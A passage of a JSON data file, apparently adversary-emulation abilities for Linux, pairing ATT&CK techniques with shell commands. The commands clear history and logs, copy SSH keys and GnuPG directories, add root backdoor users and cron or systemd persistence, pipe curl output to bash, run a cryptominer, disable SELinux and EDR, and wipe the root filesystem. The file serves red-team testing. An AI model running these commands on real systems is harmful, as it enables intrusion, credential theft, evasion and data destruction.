variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: HISTCONTROL", "platform": "linux", "requirements": [], "command": "cp $HISTFILE $HISTFILE.OLD; if ((${#HISTFILE[@]})); then echo $HISTFILE; fi; echo \"\" > $HISTFILE; if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi; ls -la $HISTFILE ; cat $HISTFILE; history -c ; if [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi", "unlocks": []}, {"id": "c9c5e0ffc0a02e309f7bdf4e2a3e5a65", "ability_name": "Clear history of a bunch of shells", "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "unset HISTFILE; export HISTFILESIZE=0; history -c", "unlocks": []}, {"id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "ability_name": "Collect ARP details", "description": "Locate all active IP and FQDNs on the network", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": ["no.logs", "fw.disabled"], "command": "arp -a", "unlocks": ["remote.host.ip"]}, {"id": "4960dc6d42d2c82ac32c9c50b64de097", "ability_name": "Command line scripts", "description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done", "unlocks": []}, {"id": "8764d6c964901b9a56ca3ffe5e5a004a", "ability_name": "Command-Line Interface", "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash", "unlocks": []}, {"id": "2f90d4de-2612-4468-9251-b220e3727452", "ability_name": "Compress Git Repository", "description": "This ability will compress a given git repository.", "tactic": "exfiltration", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": ["sensitive.files", "host.dir.git"], "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;", "unlocks": []}, {"id": "5c5b0392-1daa-45e1-967c-2f361ce78849", "ability_name": "Compress Staged Directory (Password Protected) and Split Into Smaller Chunks", "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n", "tactic": "exfiltration", "technique": "Data Transfer Size Limits", "platform": "linux", "requirements": ["sensitive.files"], "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;", "unlocks": ["host.dir.compress"]}, {"id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "ability_name": "Compress staged directory", "description": "Compress a directory on the file system", "tactic": "exfiltration", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": ["sensitive.files"], "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz", "unlocks": ["host.dir.compress"]}, {"id": "30a8cf10-73dc-497c-8261-a64cc9e91505", "ability_name": "Compress staged directory (Password Protected)", "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux", "tactic": "collection", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": ["sensitive.files"], "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg", "unlocks": ["host.dir.compress"]}, {"id": "1885b5e55da2020dceaa387722f5c840", "ability_name": "Compressing data using GZip in Python (Linux)", "description": "Uses GZip from Python to compress files\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Library", "platform": "linux", "requirements": [], "command": "$which_python -c \"import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();\"", "unlocks": []}, {"id": "432764d0dedab4bb423678865afc6508", "ability_name": "Compressing data using bz2 in Python (Linux)", "description": "Uses bz2 from Python to compress files\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Library", "platform": "linux", "requirements": [], "command": "$which_python -c \"import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();\"", "unlocks": []}, {"id": "6c9f0e04c02fe4ef258ece81317fbf9d", "ability_name": "Compressing data using tarfile in Python (Linux)", "description": "Uses tarfile from Python to compress files\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Library", "platform": "linux", "requirements": [], "command": "$which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.tar.gz', mode='w').write('/etc/passwd')\"", "unlocks": []}, {"id": "703e1a6310952c7382a88032ffe60185", "ability_name": "Compressing data using zipfile in Python (Linux)", "description": "Uses zipfile from Python to compress files\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Library", "platform": "linux", "requirements": [], "command": "$which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')\"", "unlocks": []}, {"id": "e3dac029090c397b775979ddb50fc30f", "ability_name": "Connection Proxy", "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n", "tactic": "command-and-control", "technique": "Proxy: Internal Proxy", "platform": "linux", "requirements": [], "command": "export", "unlocks": []}, {"id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "ability_name": "Copy 54ndc47 (WinRM and SCP)", "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "tactic": "lateral-movement", "technique": "Lateral Tool Transfer", "platform": "linux", "requirements": [], "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go", "unlocks": []}, {"id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "ability_name": "Copy Clipboard", "description": "copy the contents for the clipboard and print them", "tactic": "collection", "technique": "Clipboard Data", "platform": "linux", "requirements": [], "command": "xclip -o", "unlocks": []}, {"id": "71bd54afbf7d6a4cc96abee7d3195e7e", "ability_name": "Copy Private SSH Keys with CP", "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Private Keys", "platform": "linux", "requirements": [], "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\;", "unlocks": []}, {"id": "6922a3c6d0752b95a5c4a4aa073c9372", "ability_name": "Copy Private SSH Keys with rsync", "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Private Keys", "platform": "linux", "requirements": [], "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;", "unlocks": []}, {"id": "ee0a64fe7dcc5b51e8fe5f881db5b3af", "ability_name": "Copy the users GnuPG directory with rsync", "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Private Keys", "platform": "linux", "requirements": [], "command": "mkdir /tmp/GnuPG; find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;", "unlocks": []}, {"id": "7e8dd75577f0fa81b5a9b81ed6eae063", "ability_name": "Create Systemd Service", "description": "This test creates a Systemd service unit file and enables it as a service.\n", "tactic": "multiple", "technique": "Create or Modify System Process: Systemd Service", "platform": "linux", "requirements": [], "command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service; echo \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Service]\" >> /etc/systemd/system/art-systemd-service.service; echo \"Type=simple\"; echo \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Install]\" >> /etc/systemd/system/art-systemd-service.service; echo \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service; systemctl daemon-reload; systemctl enable art-systemd-service.service; systemctl start art-systemd-service.service", "unlocks": []}, {"id": "ec2e99e253e94b51fe6f07f83f29a7ef", "ability_name": "Create Systemd Service and Timer", "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n", "tactic": "multiple", "technique": "Scheduled Task/Job: Systemd Timers", "platform": "linux", "requirements": [], "command": "echo \"[Unit]\" > /etc/systemd/system/art-timer.service; echo \"Description=Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.service; echo \"[Service]\" >> /etc/systemd/system/art-timer.service; echo \"Type=simple\" >> /etc/systemd/system/art-timer.service; echo \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> /etc/systemd/system/art-timer.service; echo \"[Install]\" >> /etc/systemd/system/art-timer.service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/art-timer.service; echo \"[Unit]\" > /etc/systemd/system/art-timer.timer; echo \"Description=Executes Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.timer; echo \"Requires=art-timer.service\" >> /etc/systemd/system/art-timer.timer; echo \"[Timer]\" >> /etc/systemd/system/art-timer.timer; echo \"Unit=art-timer.service\" >> /etc/systemd/system/art-timer.timer; echo \"OnCalendar=*-*-* *:*:00\" >> /etc/systemd/system/art-timer.timer; echo \"[Install]\" >> /etc/systemd/system/art-timer.timer; echo \"WantedBy=timers.target\" >> /etc/systemd/system/art-timer.timer; systemctl start art-timer.timer; systemctl enable art-timer.timer; systemctl daemon-reload", "unlocks": []}, {"id": "b74a2618d5277373529a8eae0e301f80", "ability_name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.", "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n", "tactic": "multiple", "technique": "Create or Modify System Process: Systemd Service", "platform": "linux", "requirements": [], "command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then : ; else echo Please run from Ubuntu ,Kali OR CentOS.; fi;  ;  cat > /etc/init.d/T1543.002 << EOF; python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"; EOF; chmod +x /etc/init.d/T1543.002; if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ; systemctl enable T1543.002; systemctl start T1543.002; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002; systemctl daemon-reload; systemctl restart T1543.002", "unlocks": []}, {"id": "379509c4b83f252bc779446f0512e936", "ability_name": "Create a hidden file in a hidden directory", "description": "Creates a hidden file inside a hidden directory\n", "tactic": "defense-evasion", "technique": "Hide Artifacts: Hidden Files and Directories", "platform": "linux", "requirements": [], "command": "mkdir /var/tmp/.hidden-directory; echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file", "unlocks": []}, {"id": "cbaeea20cd3e11d2bf3512f91b155410", "ability_name": "Create a new user in Linux with `root` UID and GID.", "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n", "tactic": "persistence", "technique": "Create Account: Local Account", "platform": "linux", "requirements": [], "command": "useradd -g 0 -M -d /root -s /bin/bash butter; if [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo \"BetterWithButter\" | passwd --stdin butter; fi;", "unlocks": ["root"]}, {"id": "6de55cdb0e4e9cc25ea32b66d93d3039", "ability_name": "Create a system level transient systemd service and timer", "description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n", "tactic": "multiple", "technique": "Scheduled Task/Job: Systemd Timers", "platform": "linux", "requirements": [], "command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'", "unlocks": []}, {"id": "d9eaee9a1d1851fa44d69442f0bb3fe0", "ability_name": "Create a user account on a Linux system", "description": "Create a user via useradd\n", "tactic": "persistence", "technique": "Create Account: Local Account", "platform": "linux", "requirements": [], "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user", "unlocks": ["root"]}, {"id": "f0e294c25efe6c5a459c2e353f586b10", "ability_name": "Create a user level transient systemd service and timer", "description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n", "tactic": "multiple", "technique": "Scheduled Task/Job: Systemd Timers", "platform": "linux", "requirements": [], "command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'", "unlocks": []}, {"id": "8a84968196ec3b64b747b15008cafc2f", "ability_name": "Create and Execute Bash Shell Script", "description": "Creates and executes a simple bash script.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"; sh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"; chmod +x /tmp/art.sh; sh /tmp/art.sh", "unlocks": []}, {"id": "07315b5d93b5ea5a78b34a54be41222f", "ability_name": "Create local account (Linux)", "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n", "tactic": "multiple", "technique": "Valid Accounts: Local Accounts", "platform": "linux", "requirements": [], "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art; su art; whoami; exit", "unlocks": []}, {"id": "6469befa-748a-4b9c-a96d-f191fde47d89", "ability_name": "Create staging directory", "description": "create a directory for exfil staging", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": ["info.created"], "command": "mkdir -p staged && echo $PWD/staged", "unlocks": ["host.dir.staged"]}, {"id": "aed09300-3579-40dc-a438-08168b3f1602", "ability_name": "Create staging directory ", "description": "create a directory for exfil staging", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": ["info.created"], "command": "mkdir -p staged && echo $PWD/staged", "unlocks": ["host.dir.staged"]}, {"id": "15317c11-69aa-4f71-9364-693bd17b99f9", "ability_name": "Create staging directory  ", "description": "create a directory for exfil staging", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": ["info.created"], "command": "mkdir -p staged && echo $PWD/staged", "unlocks": ["host.dir.staged"]}, {"id": "cf0d29048615fe0d040e55067b684b49", "ability_name": "Create/Append to .bash_logout", "description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n", "tactic": "multiple", "technique": "Event Triggered Execution: .bash_profile and .bashrc", "platform": "linux", "requirements": [], "command": "useradd --create-home --shell /bin/bash art; su --login art; echo 'echo \"Atomic Red Team was here... T1546.004\" >> $HOME/art.txt' >> $HOME/.bash_logout", "unlocks": []}, {"id": "4c1562d00577b20d261d16ac889434bd", "ability_name": "Cron - Add script to /var/spool/cron/crontabs/ folder", "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "tactic": "multiple", "technique": "Scheduled Task/Job: Cron", "platform": "linux", "requirements": [], "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil", "unlocks": []}, {"id": "d9a63c6a2dac4621d430d0570c995a09", "ability_name": "Cron - Add script to all cron subfolders", "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "tactic": "multiple", "technique": "Scheduled Task/Job: Cron", "platform": "linux", "requirements": [], "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil", "unlocks": []}, {"id": "074cad3a55b99b8e434702ffcf44f4d1", "ability_name": "Cron - Replace crontab with referenced file", "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n", "tactic": "multiple", "technique": "Scheduled Task/Job: Cron", "platform": "linux", "requirements": [], "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil", "unlocks": []}, {"id": "46da2385-cf37-49cb-ba4b-a739c7a19de4", "ability_name": "Crypto (Monero) Mining", "description": "Download and execute Monero miner (xmrig) for 1 minute", "tactic": "impact", "technique": "Resource Hijacking", "platform": "linux", "requirements": ["no.logs", "fw.disabled"], "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]", "unlocks": []}, {"id": "bd527b63-9f9e-46e0-9816-b8434d2b8989", "ability_name": "Current User", "description": "Obtain user from current session", "tactic": "discovery", "technique": "System Owner/User Discovery", "platform": "linux", "requirements": [], "command": "whoami", "unlocks": []}, {"id": "3f92476875c5ba5acad424dbf15bce4d", "ability_name": "Data Compressed - nix - gzip Single File", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": [], "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)", "unlocks": []}, {"id": "03d30a66b8efe684a1711687dfbaa590", "ability_name": "Data Compressed - nix - tar Folder or File", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": [], "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME", "unlocks": []}, {"id": "c6c8a02a5633bdc9f887b94140a95934", "ability_name": "Data Compressed - nix - zip", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": [], "command": "if [ $(ls /var/log/{w,b}tmp | wc -l) > 0 ] && [ -x $(which zip) ] ; then : ; else (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip); echo Please set input_files argument to include files that exist; fi;  ;  zip $HOME/data.zip /var/log/{w,b}tmp", "unlocks": []}, {"id": "4f7a9fbe6ef84e7fb32a3e85b7762210", "ability_name": "Data Encrypted with zip and gpg symmetric", "description": "Encrypt data for exiltration\n", "tactic": "collection", "technique": "Archive Collected Data: Archive via Utility", "platform": "linux", "requirements": [], "command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then (which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg); fi;  ;  mkdir -p /tmp/T1560; cd /tmp/T1560; touch a b c d e f g; zip --password \"InsertPasswordHere\" /tmp/T1560/T1560 ./*; echo \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip; ls -l /tmp/T1560", "unlocks": []}, {"id": "bbb0df644aaeee17fa4c4ca0d3a8a29e", "ability_name": "Data Transfer Size Limits", "description": "Take a file/directory, split it into 5Mb chunks\n", "tactic": "exfiltration", "technique": "Data Transfer Size Limits", "platform": "linux", "requirements": [], "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi;  ;  cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030", "unlocks": []}, {"id": "5f844ac9-5f24-4196-a70d-17f0bd44a934", "ability_name": "Deadman - Delete agent file", "description": "Deadman ability to delete agent file after termination.", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: File Deletion", "platform": "linux", "requirements": [], "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;", "unlocks": []}, {"id": "86ab6d7ecc05b7dabc7699a9e6a0a173", "ability_name": "Decode base64 Data into Script", "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information", "platform": "linux", "requirements": [], "command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh", "unlocks": []}, {"id": "486d482ab75183d12a011b1adea22a4a", "ability_name": "Delete Filesystem - Linux", "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: File Deletion", "platform": "linux", "requirements": [], "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null", "unlocks": []}, {"id": "4cd4eb44-29a7-4259-91ae-e457b283a880", "ability_name": "Delete payload", "description": "Remove a downloaded payload file", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: File Deletion", "platform": "linux", "requirements": [], "command": null, "unlocks": []}, {"id": "dfe7d14833fd57a8e8e48019e063b0a7", "ability_name": "Delete system journal logs via rm and journalctl utilities", "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Linux or Mac System Logs", "platform": "linux", "requirements": [], "command": "sudo rm /var/log/journal/*; sudo journalctl --vacuum-time=0", "unlocks": []}, {"id": "2d5466e4b31c7db0860642bce47ef5ca", "ability_name": "Detect Virtualization Environment (Linux)", "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n", "tactic": "multiple", "technique": "Virtualization/Sandbox Evasion: System Checks", "platform": "linux", "requirements": [], "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;", "unlocks": ["virtualization.info"]}, {"id": "e7d5344c67f15cfd82d74af6caabfcf0", "ability_name": "Detecting pipe-to-shell", "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh; ls -la /tmp/art.txt; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt", "unlocks": []}, {"id": "50fa843f5f6995bbc50ee3c45ec480a2", "ability_name": "Disable Bash History Logging with SSH -T", "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname", "unlocks": []}, {"id": "26bd72e1fe309c1cf45fa9a36de63fcd", "ability_name": "Disable Cb Response", "description": "Disable the Cb Response service\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ]; then   service cbdaemon stop;   chkconfig off cbdaemon; else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];   systemctl stop cbdaemon;   systemctl disable cbdaemon; fi", "unlocks": []}, {"id": "68158bd952ed22af53a8dbfae9647839", "ability_name": "Disable Memory Swap", "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of linux.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "swapon -a ; sleep 2; swapoff -a; sync", "unlocks": []}, {"id": "30c48293038e5b226c7a115e807c7350", "ability_name": "Disable SELinux", "description": "Disables SELinux enforcement\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "setenforce 0", "unlocks": []}, {"id": "b3f5118a34b5aa8eee17a0344e815b77", "ability_name": "Disable history collection", "description": "Disables history collection in shells\n", "tactic": "defense-evasion", "technique": "Impair Defenses: HISTCONTROL", "platform": "linux", "requirements": ["root"], "command": "export HISTCONTROL=ignoreboth; whoami", "unlocks": ["no.logs"]}, {"id": "4ac711084ed7c8c6594c680874eaf931", "ability_name": "Disable journal logging via sed utility", "description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n", "tactic": "defense-evasion", "technique": "Impair Defenses", "platform": "linux", "requirements": [], "command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf", "unlocks": []}, {"id": "b2c83d7fbfb70861d13c2ba65ea483eb", "ability_name": "Disable journal logging via systemctl utility", "description": "The atomic test disables the journal logging using built-in systemctl utility\n", 